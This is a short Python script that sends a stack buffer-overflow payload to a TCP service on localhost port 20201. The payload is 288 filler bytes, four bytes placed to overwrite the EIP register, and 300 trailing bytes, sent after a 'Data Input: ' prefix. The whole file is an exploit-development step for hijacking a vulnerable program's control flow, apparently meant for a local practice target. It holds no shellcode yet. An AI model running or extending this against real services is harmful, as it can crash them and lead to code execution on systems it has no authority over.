#!/usr/bin/env python3

import socket

target_ip = "127.0.0.1"
target_port = 20201

buffer_size = 288
padding = b"A" * buffer_size
eip_override = b"B" * 4
post_eip_data = b"C" * 300

crafted_payload = padding + eip_override + post_eip_data

def send_payload():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((target_ip, target_port))
        sock.send(b"Data Input: " + crafted_payload + b"\r\n")

if __name__ == '__main__':
    send_payload()
